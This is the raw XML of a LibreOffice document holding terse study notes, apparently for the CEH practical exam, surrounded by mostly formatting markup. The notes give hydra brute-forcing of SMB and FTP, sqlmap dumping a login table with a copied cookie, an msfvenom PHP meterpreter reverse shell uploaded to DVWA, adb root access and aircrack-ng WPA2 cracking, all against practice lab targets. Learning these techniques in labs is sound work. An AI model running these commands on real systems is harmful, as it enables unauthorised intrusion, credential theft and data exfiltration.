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Bitstream Vera Sans" svg:font-family="'Bitstream Vera Sans'" style:font-family-generic="system" style:font-pitch="variable"/>
    <style:font-face style:name="Courier New" svg:font-family="'Courier New', Courier, 'Lucida Sans Typewriter', 'Lucida Typewriter', monospac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text-properties officeooo:rsid="00098024" officeooo:paragraph-rsid="0008c56b"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0008c56b" fo:background-color="#e6e905"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-line-through-style="solid" style:text-line-through-type="single" officeooo:rsid="000b1fcf" officeooo:paragraph-rsid="0008c56b"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="000b1fcf" officeooo:paragraph-rsid="0008c56b" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#10334a" loext:opacity="100%" style:font-name="Courier New" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:paragraph-rsid="0008c56b" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#10334a" loext:opacity="100%" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:paragraph-rsid="0008c56b" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00132109" officeooo:paragraph-rsid="0008c56b" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0007aefc" officeooo:paragraph-rsid="0008c56b" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:paragraph-rsid="0008c56b" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000b1fcf" officeooo:paragraph-rsid="0008c56b"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000bacd3" officeooo:paragraph-rsid="0008c56b"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001b8e99" officeooo:paragraph-rsid="0008c56b"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0008c56b" fo:background-color="#ffff00"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0008c56b" officeooo:paragraph-rsid="0008c56b" fo:background-color="#ffff00"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0007aefc" officeooo:paragraph-rsid="0008c56b"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00117e9f" officeooo:paragraph-rsid="0008c56b"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d12b3" officeooo:paragraph-rsid="0008c56b"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0008c56b"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0008c56b" officeooo:paragraph-rsid="0008c56b"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="00189ce5"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00132109"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="001694df"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="0007aefc"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="001b8e99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officeooo:rsid="00117e9f"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties officeooo:rsid="000b1fcf"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties officeooo:rsid="0008c56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/>
      <text:p text:style-name="P19">Finding Spacific servers</text:p>
      <text:p text:style-name="P18">sudo msfdb init</text:p>
      <text:p text:style-name="P18">(one terminal start msfconsole)</text:p>
      <text:p text:style-name="P18">(other do nmap)</text:p>
      <text:p text:style-name="P18">nmap -sV -sC -A -Pn 192.168.0.1/24</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P19">SMB</text:p>
      <text:p text:style-name="P18">https://www.linkedin.com/pulse/ceh-practical-exam-all-you-need-know-xiotz-exzpf/</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P3">Smbmap -H 10.129.193.5?</text:p>
      <text:p text:style-name="P4">nmap --script smb-enum-users.nse -p445 <text:span text:style-name="T1">target</text:span></text:p>
      <text:p text:style-name="P9">hydra -<text:span text:style-name="T2">L </text:span>/usr/share/wordlist/username.txt -<text:span text:style-name="T2">P </text:span>wordlist.txt 19.2.168.0.0 <text:span text:style-name="T3">smb</text:span></text:p>
      <text:p text:style-name="P7">hydra -l singleUserName -p singlePassword 192.168.0.0 <text:span text:style-name="T3">smb</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P11">Adb connect target:<text:span text:style-name="T5">5555</text:span></text:p>
      <text:p text:style-name="P11">adb root</text:p>
      <text:p text:style-name="P11">adb shell</text:p>
      <text:p text:style-name="P11">find / -type f -name “*.elf”</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P12">adb pull sdcard/log.txt /home/attacker/Desktop/</text:p>
      <text:p text:style-name="P12">apt-get install ent</text:p>
      <text:p text:style-name="P12">ent file</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P19">Vulnerability</text:p>
      <text:p text:style-name="P15">nmap -Pn –script vuln 172.20.0.16</text:p>
      <text:p text:style-name="P15">Google each CVE and find the score</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18">Use Venom</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P15">OpenStego <text:s/><text:span text:style-name="T9">for </text:span>Windows</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P18"><text:span text:style-name="T9">crack ftp</text:span></text:p>
      <text:p text:style-name="P9">hydra -l /usr/share/wordlist/username.txt -p wordlist.txt 19.2.168.0.0 ftp</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P19">privilege escalation</text:p>
      <text:p text:style-name="P8">Nmap -sV -p 22 target/22</text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T6">ssh </text:span><text:a xlink:type="simple" xlink:href="mailto:smith@targetIP" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T6">smith@targetIP</text:span></text:a></text:p>
      <text:p text:style-name="P8">find . -name imroot.txt</text:p>
      <text:p text:style-name="P8">cat path/to/imroot.txt</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P19">malware</text:p>
      <text:p text:style-name="P9">Use windows PEid software or PE explorer tools</text:p>
      <text:p text:style-name="P9">Multi scan</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P19">SQL injection attack </text:p>
      <text:p text:style-name="P9">Login as karen, go to console and enter "document.cookie"</text:p>
      <text:p text:style-name="P9">Copy the cookie</text:p>
      <text:p text:style-name="P5"><text:soft-page-break/></text:p>
      <text:p text:style-name="P6">Open the vulnerable website </text:p>
      <text:p text:style-name="P6">Copy the cookie from the inspect element</text:p>
      <text:p text:style-name="P6">Open the terminal to use sqlmap </text:p>
      <text:p text:style-name="P6">sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl="; --dbs</text:p>
      <text:p text:style-name="P6">sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables</text:p>
      <text:p text:style-name="P6">sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P19">DVWA upload file</text:p>
      <text:p text:style-name="P18">msfvenom -p php/meterpreter/reverse_tcp lhost= lport= -f raw</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18">create a file and name it hack.php</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18">msfconsole</text:p>
      <text:p text:style-name="P18"><text:s/>- use multi/handler</text:p>
      <text:p text:style-name="P18"><text:s/>- set payload php/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="P18"><text:s/>- set lhost hostIP</text:p>
      <text:p text:style-name="P18"><text:s/>- set lport 3333</text:p>
      <text:p text:style-name="P18"><text:s/>- run</text:p>
      <text:p text:style-name="P18"><text:s/></text:p>
      <text:p text:style-name="P18"><text:s/>Run below in browser</text:p>
      <text:p text:style-name="P18"><text:s/>target:8<text:span text:style-name="T7">080</text:span>/DVWA/hackable/uploads/hack.php</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P16">meterpreter &gt; download hack.php /root/</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:a xlink:type="simple" xlink:href="https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"/></text:p>
      <text:p text:style-name="P18"><text:a xlink:type="simple" xlink:href="https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/</text:a></text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18">https://fzuckerman.wordpress.com/2016/10/09/post-exploitation-downloading-files-from-a-victim-with-metasploit-meterpreter-scripts/</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P8">* Cracking WPA2</text:p>
      <text:p text:style-name="P8">- aircrack-ng -a2 -b BSSID -w password.txt PCAP_file</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P1">NOTES :</text:p>
      <text:p text:style-name="P1">SMB</text:p>
      <text:p text:style-name="P1">nmap -p 445 –script smb-enum-shares 10.10.1.22</text:p>
      <text:p text:style-name="P1">nmap -p 445 –script smb-enum-users 10.10.1.22</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">-<text:span text:style-name="T8">This worked to root for metasploitable 2 </text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://linux-hacking-guide.blogspot.com/2015/06/metasploitable2-hack-samba-server-and.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://linux-hacking-guide.blogspot.com/2015/06/metasploitable2-hack-samba-server-and.html</text:a></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P17">youtube : </text:p>
      <text:p text:style-name="P17">Good explanation </text:p>
      <text:p text:style-name="P17">https://www.youtube.com/watch?v=q1bIkeSIe8U</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"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Bitstream Vera Sans" svg:font-family="'Bitstream Vera Sans'" style:font-family-generic="system" style:font-pitch="variable"/>
    <style:font-face style:name="Courier New" svg:font-family="'Courier New', Courier, 'Lucida Sans Typewriter', 'Lucida Typewriter', monospac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Bitstream Vera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Bitstream Vera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9T15:24:46.276088135</meta:creation-date>
    <dc:date>2024-02-19T15:32:43.915737651</dc:date>
    <meta:editing-duration>PT7M58S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="68" meta:word-count="266" meta:character-count="2360" meta:non-whitespace-character-count="2153"/>
    <meta:generator>LibreOffice/7.4.7.2$Linux_X86_64 LibreOffice_project/40$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>